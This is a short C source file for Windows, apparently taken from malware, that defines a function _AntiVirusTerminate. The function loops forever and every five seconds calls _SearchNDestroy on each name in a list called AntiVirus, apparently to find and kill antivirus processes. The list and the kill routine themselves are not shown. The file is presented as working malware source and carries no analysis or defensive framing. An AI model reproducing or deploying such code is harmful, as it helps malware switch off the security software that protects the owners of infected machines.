#include "data_globals.h"
#include <windows.h>
#include <stdbool.h>

DWORD WINAPI _AntiVirusTerminate(void)
{
    int index = 0;
    
    do {
        for (index = 0; AntiVirus[index] != NULL; index++) {
            _SearchNDestroy((char *)AntiVirus[index]);
        }
        Sleep(5000);
    } while(true);
    
    return 0;
}
